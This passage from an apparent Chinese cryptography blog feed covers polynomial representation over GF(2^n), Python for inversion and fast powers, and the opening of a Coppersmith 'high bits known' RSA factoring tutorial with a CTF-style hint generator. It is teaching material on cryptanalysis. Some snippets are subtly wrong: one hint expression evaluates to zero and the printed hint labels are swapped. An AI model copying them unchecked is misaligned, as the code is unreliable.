reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">0</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8746639999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:2em;"></span><span class="mord">∀</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">}</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>那么多项式可以被</mtext><mi>n</mi><mtext>元组</mtext><mo stretchy="false">(</mo><msub><mi>a</mi><mrow><mi>n</mi><mtext>−</mtext><mn>1</mn></mrow></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>a</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>0</mn></msub><mo stretchy="false">)</mo><mtext>唯一表示，</mtext><mspace linebreak="newline"></mspace><mtext>实际上这个二元组就是</mtext><mn>01</mn><mtext>序列，</mtext><mi>n</mi><mtext>元组</mtext><mo stretchy="false">(</mo><msub><mi>a</mi><mrow><mi>n</mi><mtext>−</mtext><mn>1</mn></mrow></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>a</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>0</mn></msub><mo stretchy="false">)</mo><mtext>就是</mtext><mi>n</mi><mtext>比特长度的</mtext><mn>01</mn><mtext>序列</mtext><mspace linebreak="newline"></mspace><mtext>比如</mtext><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>x</mi><mn>6</mn></msup><mo>+</mo><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mi>x</mi><mo>+</mo><mn>1</mn><mtext>其表示的就是</mtext><mn>01010111</mn><mtext>。</mtext><mspace linebreak="newline"></mspace><mtext>因此多项式就可以唯一地转换为二进制串，在密码学中字符可以被编号为数字，然后数字用二进制表示就可以转换为一个多项式</mtext></mrow><annotation encoding="application/x-tex">那么多项式可以被n元组 ( a_{n − 1}, . . . , a_1 , a_0 ) 唯一表示，\\实际上这个二元组就是01序列，n元组 ( a_{n − 1}, . . . , a_1 , a_0 )就是n比特长度的01序列\\比如 f ( x ) = x^6 + x^4 + x^2 + x + 1 其表示的就是01010111。\\因此多项式就可以唯一地转换为二进制串，在密码学中字符可以被编号为数字，然后数字用二进制表示就可以转换为一个多项式
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">那</span><span class="mord cjk_fallback">么</span><span class="mord cjk_fallback">多</span><span class="mord cjk_fallback">项</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">被</span><span class="mord mathnormal">n</span><span class="mord cjk_fallback">元</span><span class="mord cjk_fallback">组</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord cjk_fallback">唯</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">表</span><span class="mord cjk_fallback">示</span><span class="mord cjk_fallback">，</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">实</span><span class="mord cjk_fallback">际</span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">二</span><span class="mord cjk_fallback">元</span><span class="mord cjk_fallback">组</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">是</span><span class="mord">0</span><span class="mord">1</span><span class="mord cjk_fallback">序</span><span class="mord cjk_fallback">列</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal">n</span><span class="mord cjk_fallback">元</span><span class="mord cjk_fallback">组</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">是</span><span class="mord mathnormal">n</span><span class="mord cjk_fallback">比</span><span class="mord cjk_fallback">特</span><span class="mord cjk_fallback">长</span><span class="mord cjk_fallback">度</span><span class="mord cjk_fallback">的</span><span class="mord">0</span><span class="mord">1</span><span class="mord cjk_fallback">序</span><span class="mord cjk_fallback">列</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">比</span><span class="mord cjk_fallback">如</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord cjk_fallback">其</span><span class="mord cjk_fallback">表</span><span class="mord cjk_fallback">示</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">是</span><span class="mord">0</span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">1</span><span class="mord">1</span><span class="mord cjk_fallback">。</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">因</span><span class="mord cjk_fallback">此</span><span class="mord cjk_fallback">多</span><span class="mord cjk_fallback">项</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">唯</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">地</span><span class="mord cjk_fallback">转</span><span class="mord cjk_fallback">换</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">二</span><span class="mord cjk_fallback">进</span><span class="mord cjk_fallback">制</span><span class="mord cjk_fallback">串</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">密</span><span class="mord cjk_fallback">码</span><span class="mord cjk_fallback">学</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">字</span><span class="mord cjk_fallback">符</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">被</span><span class="mord cjk_fallback">编</span><span class="mord cjk_fallback">号</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">字</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">然</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">字</span><span class="mord cjk_fallback">用</span><span class="mord cjk_fallback">二</span><span class="mord cjk_fallback">进</span><span class="mord cjk_fallback">制</span><span class="mord cjk_fallback">表</span><span class="mord cjk_fallback">示</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">转</span><span class="mord cjk_fallback">换</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">多</span><span class="mord cjk_fallback">项</span><span class="mord cjk_fallback">式</span></span></span></span></span></p>
<p>其实对于计算机而言就是将人对有限域的认知转换为二进制模式</p>
<h2 id="用途"><a class="anchor" href="#用途">#</a> 用途</h2>
<h3 id="有限域-gf2n-求逆"><a class="anchor" href="#有限域-gf2n-求逆">#</a> 有限域 GF (2^n) 求逆</h3>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">def</span> <span class="token function">gf2_inverse</span><span class="token punctuation">(</span>a<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> poly<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token triple-quoted-string string">"""</pre></td></tr><tr><td data-num="3"></td><td><pre>    :param a: GF(2^n) 元素</pre></td></tr><tr><td data-num="4"></td><td><pre>    :param poly: 不可约多项式</pre></td></tr><tr><td data-num="5"></td><td><pre>    :return: a^(-1)</pre></td></tr><tr><td data-num="6"></td><td><pre>    """</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    x1<span class="token punctuation">,</span> x2 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    b <span class="token operator">=</span> poly</pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">while</span> b<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        q<span class="token punctuation">,</span> r <span class="token operator">=</span> gf2_divmod<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> poly<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        a<span class="token punctuation">,</span> b <span class="token operator">=</span> b<span class="token punctuation">,</span> r</pre></td></tr><tr><td data-num="12"></td><td><pre>        x1<span class="token punctuation">,</span> x2 <span class="token operator">=</span> x2<span class="token punctuation">,</span> x1 <span class="token operator">^</span> gf2_mul<span class="token punctuation">(</span>q<span class="token punctuation">,</span> x2<span class="token punctuation">,</span> poly<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">return</span> x1</pre></td></tr></table></figure><h3 id="有限域-gf2n-快速幂"><a class="anchor" href="#有限域-gf2n-快速幂">#</a> 有限域 GF (2^n) 快速幂</h3>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">def</span> <span class="token function">gf2_quick_pow_mod</span><span class="token punctuation">(</span>a<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> k<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> poly<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token triple-quoted-string string">"""</pre></td></tr><tr><td data-num="3"></td><td><pre>    :return: a^k mod p</pre></td></tr><tr><td data-num="4"></td><td><pre>    """</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    res <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># res: 计算结果</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">while</span> k<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token keyword">if</span> k <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">:</span>  <span class="token comment"># 如果 n 是奇数</span></pre></td></tr><tr><td data-num="8"></td><td><pre>            res <span class="token operator">=</span> gf2_mul<span class="token punctuation">(</span>res<span class="token punctuation">,</span> a<span class="token punctuation">,</span> poly<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        k <span class="token operator">=</span> k <span class="token operator">//</span> <span class="token number">2</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        a <span class="token operator">=</span> gf2_mul<span class="token punctuation">(</span>a<span class="token punctuation">,</span> a<span class="token punctuation">,</span> poly<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token keyword">return</span> res</pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token triple-quoted-string string">'''</pre></td></tr><tr><td data-num="13"></td><td><pre># 样例二</pre></td></tr><tr><td data-num="14"></td><td><pre>a = 1494462659429290047815067355171411187560751791530</pre></td></tr><tr><td data-num="15"></td><td><pre>k = 65537</pre></td></tr><tr><td data-num="16"></td><td><pre>p = 2268838711304724304304396119509416774597723292474</pre></td></tr><tr><td data-num="17"></td><td><pre># 结果 a^k mod p</pre></td></tr><tr><td data-num="18"></td><td><pre>res = 2099538163720891467842744895846522520832379454230</pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre>'''</span></pre></td></tr></table></figure><p>python 使用自带的  <code>pow</code>  函数 效率更高</p>
<p>参考：</p>
<p>有限域上的多项式 <span class="exturl" data-url="aHR0cHM6Ly93d3cucnVhbngubmV0L3BvbHlub21pYWwtcnNhLw==">https://www.ruanx.net/polynomial-rsa/</span></p>
<p>有限域的结构 <span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80MTYxMjgzMjM=">https://zhuanlan.zhihu.com/p/416128323</span></p>
]]></content>
      <categories>
        <category>数论</category>
        <category>Math</category>
      </categories>
      <tags>
        <tag>数论</tag>
      </tags>
  </entry>
  <entry>
    <title>Coppersmith定理</title>
    <url>/crypto/write/Coppersmith/</url>
    <content><![CDATA[<p>*<strong>Coppersmith*</strong><br />
 它的用途主要是找到多项式方程小值根，该求根算法本质上基于 Lenstra，lenstra 和 lovasz 给出的著名的 LLL 约化基算法<br />
<a id="more"></a></p>
<p>Coppersmith 的结论不同于传统的格基约化在密码分析中的应用方法。第一，他的结论是在非线性的情况下考虑的，而传统的方法通常是线性的；第二，若将 Coppersmith 的攻击方法推广到多变元的情况，则该方法是启发式的。也就是说推广后的结论依赖于一个假设条件，但是该假设条件在实际应用中基本可以得到满足。</p>
<p>好了，目前为止我们已经知道 Coppersmith 算是 RSA 里面门槛蛮高的算法了，开始之前还是有很多要说的，当然光凭我的一篇拙论很难搞懂，建议搭配其他文章阅读。</p>
<h2 id="factoring-with-high-bits-known"><a class="anchor" href="#factoring-with-high-bits-known">#</a> Factoring with High Bits Known</h2>
<p>首先先来了解一下 RSA 中的高位分解 —— 当我们知道一个公钥中模数 N 的一个因子的较高位时，我们就有一定几率来分解 N。</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>n <span class="token operator">=</span> p <span class="token operator">*</span> q</pre></td></tr><tr><td data-num="6"></td><td><pre>e <span class="token operator">=</span> <span class="token number">65537</span></pre></td></tr><tr><td data-num="7"></td><td><pre>hint1 <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">>></span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">128</span> </pre></td></tr><tr><td data-num="8"></td><td><pre>hint2 <span class="token operator">=</span> p <span class="token operator">>></span> <span class="token number">128</span> </pre></td></tr><tr><td data-num="9"></td><td><pre>hint3 <span class="token operator">=</span> p<span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">>></span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span></pre></td></tr><tr><td data-num="10"></td><td><pre>hint4 <span class="token operator">=</span> p<span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span><span class="token number">900</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"p: %d\nq: %d"</span><span class="token operator">%</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span>q<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hint1: %d\nhint2: %d\nhint4: %d\nhint3: %d"</span><span class="token operator">%</span><span class="token punctuation">(</span>hint1<span class="token punctuation">,</span>hint2<span class="token punctuation">,</span>hint3<span class="token punctuation">,</span>hint4<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>p 原本 512bit 但是 (p&gt;&gt; 128)&lt;&lt;128 时低 128bit 未知，这种情况我们称作 p 高位已知</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/04/21/59e770afebf67a75.png" alt="" /></p>
<p>为了更直观地对比，这里我把 p 和 hint1 截取了一下。可以看到 p 和 p_high 的区别在于尾数不同，这就是所谓的高比特位相同但是低比特位由于二进制移位而发生了改变。</p>
<p>p 和 p_high 都是 154bits, 高比特位有 115bits，低比特位 39bits.</p>
<p>hint2 中 p 未知的二进制位数达到了 128</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>p <span class="token operator">=</span> <span class="token number">9341558054191386215066345451630726417358808959728962858150369368064732931483299449258725330485809722318563623217165</span> <span class="token number">569022454807609001623119788467130139311</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>p_high <span class="token operator">=</span> <span class="token number">9341558054191386215066345451630726417358808959728962858150369368064732931483299449258725330485809722318563623217165</span> <span class="token number">426184535223597456821873194001145790464</span> <span class="token comment">#hint1</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>hint2<span class="token punctuation">:</span> <span class="token number">27452371801451037018511721067197827374680822064418745258798259123443933200806816038160568641586718215423031102731319</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>hint4<span class="token punctuation">:</span> <span class="token number">9341558054191386215066345451630726417358808959728962858150369368064732931483299449258725330485809722318563623217165569022454807609001623119788467130139311</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>hint3<span class="token punctuation">:</span> <span class="token number">8452712498170643941637436558664265704301557216577944354047371344426782440907597751590676094202515006314790319892114049520559506760656753529663172024680615871725227215021223196330336218089891573548938467806048528656646134120401770655845327925464974622209497505896677834064</span></pre></td></tr></table></figure><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>在</mtext><mi>l</mi><mi>o</mi><mi>g</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo><mtext>和</mtext><mfrac><mn>1</mn><mi>ϵ</mi></mfrac><mtext>相关的时间复杂度内分解</mtext><mi>N</mi><mtext>需要满足以下条件</mtext></mrow><annotation encoding="application/x-tex">在log(N)和\frac{1}{\epsilon}相关的时间复杂度内分解N需要满足以下条件
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.00744em;vertical-align:-0.686em;"></span><span class="mord cjk_fallback">在</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span><span class="mord cjk_fallback">和</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">ϵ</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord cjk_fallback">相</span><span class="mord cjk_fallback">关</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">间</span><span class="mord cjk_fallback">复</span><span class="mord cjk_fallback">杂</span><span class="mord cjk_fallback">度</span><span class="mord cjk_fallback">内</span><span class="mord cjk_fallback">分</span><span class="mord cjk_fallback">解</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord cjk_fallback">需</span><span class="mord cjk_fallback">要</span><span class="mord cjk_fallback">满</span><span class="mord cjk_fallback">足</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">下</span><span class="mord cjk_fallback">条</span><span class="mord 